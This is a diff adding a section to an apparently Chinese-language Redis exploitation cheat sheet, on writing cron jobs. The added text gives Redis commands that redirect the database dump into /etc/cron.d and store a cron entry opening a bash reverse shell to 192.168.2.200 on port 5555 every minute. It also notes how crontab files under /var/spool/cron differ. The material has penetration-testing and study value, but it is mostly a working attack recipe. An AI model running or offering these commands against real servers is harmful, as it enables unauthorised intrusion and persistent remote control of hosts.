@@ -187,6 +187,16 @@ save
 
 ### 写计划任务
 
+可以写/etc/cron.d或者/var/spool/cron/crontabs/<username>
+
+注意，写/var/spool/cron/crontabs/<username>的时候计划任务内容不需要再指定用户名
+
+```
+config set dirname /etc/cron.d
+config set dbfilename rev
+set test "\n* * * * * root /bin/bash -i >& /dev/tcp/192.168.2.200/5555 0>&1\n"
+```
+
 ## 主从复制 + 
 
 ### 原理
